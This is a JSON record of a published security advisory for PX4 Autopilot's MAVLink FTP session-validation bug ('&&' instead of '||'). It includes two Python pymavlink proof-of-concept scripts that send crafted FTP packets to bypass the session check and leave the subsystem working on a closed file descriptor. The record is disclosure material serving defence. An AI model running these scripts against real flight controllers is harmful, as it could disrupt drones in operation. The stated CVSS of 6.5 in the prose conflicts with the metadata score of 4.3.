@@ -1,0 +1,119 @@
+{
+  "ghsa_id": "GHSA-pp2c-jr5g-6f2m",
+  "cve_id": "CVE-2026-32713",
+  "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-pp2c-jr5g-6f2m",
+  "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-pp2c-jr5g-6f2m",
+  "summary": "PX4 Autopilot MAVLink FTP Session Validation Logic Error Allows Operations on Invalid File Descriptors",
+  "description": "### Summary\r\n\r\nA logic error in the PX4 Autopilot MAVLink FTP session validation uses incorrect boolean logic (`&&` instead of `||`), allowing `BurstReadFile` and `WriteFile` operations to proceed with invalid sessions or closed file descriptors. This enables an unauthenticated attacker to put the FTP subsystem into an inconsistent state, trigger operations on invalid file descriptors, and bypass session isolation checks. CVSS 6.5 Medium.\r\n\r\n### Details\r\n\r\nThe vulnerability is a straightforward logic error in `src/modules/mavlink/mavlink_ftp.cpp` where two functions use `&&` (logical AND) instead of `||` (logical OR) for session validation, diverging from the correct implementation used in a third function.\r\n\r\n**1. Correct implementation in `_workRead` (`mavlink_ftp.cpp:559`)**\r\n\r\nThe `_workRead` function correctly rejects requests when *either* the session ID is wrong *or* the file descriptor is invalid:\r\n\r\n```cpp\r\n// mavlink_ftp.cpp:559 -- CORRECT: uses || (logical OR)\r\nMavlinkFTP::ErrorCode\r\nMavlinkFTP::_workRead(PayloadHeader *payload)\r\n{\r\n    if (payload->session != 0 || _session_info.fd < 0) {\r\n        return kErrInvalidSession;\r\n    }\r\n    // ... proceeds with read\r\n}\r\n```\r\n\r\nTruth table for `||`:\r\n| `session != 0` | `fd < 0` | Result | Correct? |\r\n|:-:|:-:|:-:|:-:|\r\n| false | false | **PASS** (valid session, valid fd) | Yes |\r\n| false | true | **REJECT** (valid session, no fd) | Yes |\r\n| true | false | **REJECT** (wrong session, valid fd) | Yes |\r\n| true | true | **REJECT** (wrong session, no fd) | Yes |\r\n\r\n**2. Buggy implementation in `_workBurst` (`mavlink_ftp.cpp:597`)**\r\n\r\n```cpp\r\n// mavlink_ftp.cpp:597 -- BUG: uses && (logical AND)\r\nMavlinkFTP::ErrorCode\r\nMavlinkFTP::_workBurst(PayloadHeader *payload, uint8_t target_system_id, uint8_t target_component_id)\r\n{\r\n    if (payload->session != 0 && _session_info.fd < 0) {\r\n        return kErrInvalidSession;\r\n    }\r\n    // Setup for streaming sends\r\n    _session_info.stream_download = true;\r\n    _session_info.stream_offset = payload->offset;\r\n    // ...\r\n}\r\n```\r\n\r\n**3. Buggy implementation in `_workWrite` (`mavlink_ftp.cpp:618`)**\r\n\r\n```cpp\r\n// mavlink_ftp.cpp:618 -- BUG: uses && (logical AND)\r\nMavlinkFTP::ErrorCode\r\nMavlinkFTP::_workWrite(PayloadHeader *payload)\r\n{\r\n    if (payload->session != 0 && _session_info.fd < 0) {\r\n        return kErrInvalidSession;\r\n    }\r\n    // ...\r\n    if (lseek(_session_info.fd, payload->offset, SEEK_SET) < 0) {\r\n        // ...\r\n    }\r\n    int bytes_written = ::write(_session_info.fd, &payload->data[0], payload->size);\r\n    // ...\r\n}\r\n```\r\n\r\nTruth table for `&&`:\r\n| `session != 0` | `fd < 0` | Result | Correct? |\r\n|:-:|:-:|:-:|:-:|\r\n| false | false | **PASS** (valid session, valid fd) | Yes |\r\n| false | true | **PASS** (valid session, no fd) | **NO -- should reject** |\r\n| true | false | **PASS** (wrong session, valid fd) | **NO -- should reject** |\r\n| true | true | **REJECT** (wrong session, no fd) | Yes |\r\n\r\n**Exploitable scenarios:**\r\n\r\n**Scenario A: Operations on closed file descriptor (session=0, fd=-1)**\r\n- Default state: `session=0`, `_session_info.fd=-1` (no file open)\r\n- Attacker sends `kCmdBurstReadFile` with `session=0`\r\n- Check: `0 != 0 && -1 < 0` → `false && true` → `false` → **check bypassed**\r\n- Code sets `_session_info.stream_download = true` with fd=-1\r\n- `send()` later attempts `lseek` and `read` on fd=-1\r\n- FTP enters an inconsistent streaming state\r\n\r\n**Scenario B: Session ID isolation bypass (session!=0, fd>=0)**\r\n- A file has been opened (fd is valid, assigned to session 0)\r\n- Attacker sends `kCmdBurstReadFile` or `kCmdWriteFile` with `session=5`\r\n- Check: `5 != 0 && fd >= 0` → `true && false` → `false` → **check bypassed**\r\n- Operation proceeds on the file from session 0 despite wrong session ID\r\n- Session IDs provide no isolation\r\n\r\n### PoC\r\n\r\n**Prerequisites:**\r\n- MAVLink communication channel to a PX4 flight controller\r\n- Python with `pymavlink`\r\n\r\n**Reproducing Scenario A (burst read on invalid fd):**\r\n\r\n```python\r\nfrom pymavlink import mavutil\r\nimport struct, time\r\n\r\nmav = mavutil.mavlink_connection('udp:127.0.0.1:14540')\r\nmav.wait_heartbeat()\r\n\r\nTARGET_SYS = mav.target_system\r\nTARGET_COMP = mav.target_component\r\n\r\ndef make_ftp_payload(seq, session, opcode, size, offset, data=b''):\r\n    \"\"\"Build FTP PayloadHeader + data.\"\"\"\r\n    header = struct.pack('<HBBBBBxI', seq, session, opcode, size, 0, 0, offset)\r\n    return header + data\r\n\r\n# Do NOT open any file first -- fd should be -1\r\n\r\n# Send kCmdBurstReadFile (opcode=15) with session=0\r\n# With the bug, this bypasses the session check because:\r\n#   session(0) != 0 --> false\r\n#   fd(-1) < 0 --> true\r\n#   false && true --> false --> check skipped!\r\npayload = make_ftp_payload(seq=1, session=0, opcode=15, size=0, offset=0)\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\n\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYS, TARGET_COMP, ftp_msg)\r\ntime.sleep(1)\r\n\r\n# The FTP subsystem is now in stream_download mode with fd=-1\r\n# Subsequent send() calls will attempt lseek/read on fd=-1 and generate errors\r\n# This can be confirmed by monitoring PX4 debug output for \"seek fail\" or EBADF errors\r\n\r\n# Receive response\r\nmsg = mav.recv_match(type='FILE_TRANSFER_PROTOCOL', blocking=True, timeout=5)\r\nif msg:\r\n    resp = bytes(msg.payload)\r\n    opcode = resp[3]\r\n    if opcode == 128:  # kRspAck\r\n        print(\"[!] BUG CONFIRMED: Burst accepted without open file (fd=-1)\")\r\n    elif opcode == 129:  # kRspNak\r\n        error = resp[12]\r\n        print(f\"[*] NAK received, error code: {error}\")\r\n        # If error 4 (kErrInvalidSession), the bug is NOT present (patched)\r\n        # If error 2 (kErrFailErrno), the bug IS present (EBADF from lseek on fd=-1)\r\n```\r\n\r\n**Reproducing Scenario B (session ID bypass):**\r\n\r\n```python\r\n# Step 1: Open a file normally (session=0)\r\npath = b'/fs/microsd/log\\x00'  # or any valid path\r\npayload = make_ftp_payload(seq=0, session=0, opcode=4, size=len(path), offset=0, data=path)\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYS, TARGET_COMP, ftp_msg)\r\ntime.sleep(0.5)\r\n\r\n# Step 2: Send burst read with WRONG session ID (session=5)\r\n# With the bug: session(5) != 0 --> true, fd(N) < 0 --> false\r\n#   true && false --> false --> check bypassed!\r\n# Operation proceeds on session 0's file despite requesting session 5\r\npayload = make_ftp_payload(seq=1, session=5, opcode=15, size=0, offset=0)\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYS, TARGET_COMP, ftp_msg)\r\ntime.sleep(1)\r\n\r\nmsg = mav.recv_match(type='FILE_TRANSFER_PROTOCOL', blocking=True, timeout=5)\r\nif msg:\r\n    resp = bytes(msg.payload)\r\n    opcode = resp[3]\r\n    if opcode == 128:  # kRspAck\r\n        print(\"[!] BUG CONFIRMED: Wrong session ID accepted, reading from session 0's file\")\r\n```\r\n\r\n### Impact\r\n\r\nThis is a **logic error vulnerability** that breaks the session validation in the MAVLink FTP protocol implementation.\r\n\r\n**Who is impacted:**\r\n- All PX4 deployments using MAVLink FTP (file transfer, parameter upload, log download)\r\n- Ground control stations that rely on session semantics for concurrent FTP operations\r\n\r\n**What an attacker can do:**\r\n- Trigger FTP operations on invalid file descriptors, causing the subsystem to enter inconsistent state\r\n- Bypass session ID isolation, accessing files opened in other sessions\r\n- Put the FTP subsystem into stream download mode with no valid file, potentially blocking other FTP operations\r\n- Trigger error code paths (EBADF from lseek/read/write on fd=-1) that may have unintended side effects\r\n\r\n**Limitations:**\r\n- Operations on fd=-1 will fail at the syscall level (EBADF), limiting data exfiltration\r\n- PX4 currently only supports one session (session 0), so session isolation bypass has limited practical impact\r\n- The primary risk is denial of service to the FTP subsystem and triggering of unexpected error paths",
+  "severity": "medium",
+  "author": null,
+  "publisher": {
+    "login": "mrpollo",
+    "id": 317648,
+    "node_id": "MDQ6VXNlcjMxNzY0OA==",
+    "avatar_url": "https://avatars.githubusercontent.com/u/317648?v=4",
+    "gravatar_id": "",
+    "url": "https://api.github.com/users/mrpollo",
+    "html_url": "https://github.com/mrpollo",
+    "followers_url": "https://api.github.com/users/mrpollo/followers",
+    "following_url": "https://api.github.com/users/mrpollo/following{/other_user}",
+    "gists_url": "https://api.github.com/users/mrpollo/gists{/gist_id}",
+    "starred_url": "https://api.github.com/users/mrpollo/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/mrpollo/subscriptions",
+    "organizations_url": "https://api.github.com/users/mrpollo/orgs",
+    "repos_url": "https://api.github.com/users/mrpollo/repos",
+    "events_url": "https://api.github.com/users/mrpollo/events{/privacy}",
+    "received_events_url": "https://api.github.com/users/mrpollo/received_events",
+    "type": "User",
+    "user_view_type": "public",
+    "site_admin": false
+  },
+  "identifiers": [
+    {
+      "value": "GHSA-pp2c-jr5g-6f2m",
+      "type": "GHSA"
+    },
+    {
+      "value": "CVE-2026-32713",
+      "type": "CVE"
+    }
+  ],
+  "state": "published",
+  "created_at": null,
+  "updated_at": "2026-03-13T19:53:10Z",
+  "published_at": "2026-03-13T19:53:10Z",
+  "closed_at": null,
+  "withdrawn_at": null,
+  "submission": null,
+  "vulnerabilities": [
+    {
+      "package": {
+        "ecosystem": "other",
+        "name": "PX4/PX4-Autopilot"
+      },
+      "vulnerable_version_range": "<= 1.17.0-rc1",
+      "patched_versions": "1.17.0-rc2",
+      "vulnerable_functions": []
+    }
+  ],
+  "cvss_severities": {
+    "cvss_v3": {
+      "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+      "score": 4.3
+    },
+    "cvss_v4": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  "cwes": [
+    {
+      "cwe_id": "CWE-670",
+      "name": "Always-Incorrect Control Flow Implementation"
+    }
+  ],
+  "cwe_ids": [
+    "CWE-670"
+  ],
+  "credits": [
+    {
+      "login": "dxlerYT",
+      "type": "reporter"
+    }
+  ],
+  "credits_detailed": [
+    {
+      "user": {
+        "login": "dxlerYT",
+        "id": 73416867,
+        "node_id": "MDQ6VXNlcjczNDE2ODY3",
+        "avatar_url": "https://avatars.githubusercontent.com/u/73416867?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/dxlerYT",
+        "html_url": "https://github.com/dxlerYT",
+        "followers_url": "https://api.github.com/users/dxlerYT/followers",
+        "following_url": "https://api.github.com/users/dxlerYT/following{/other_user}",
+        "gists_url": "https://api.github.com/users/dxlerYT/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/dxlerYT/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/dxlerYT/subscriptions",
+        "organizations_url": "https://api.github.com/users/dxlerYT/orgs",
+        "repos_url": "https://api.github.com/users/dxlerYT/repos",
+        "events_url": "https://api.github.com/users/dxlerYT/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/dxlerYT/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter",
+      "state": "accepted"
+    }
+  ],
+  "collaborating_users": null,
+  "collaborating_teams": null,
+  "private_fork": null,
+  "comments": 3,
+  "cvss": {
+    "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+    "score": 4.3
+  }
+}
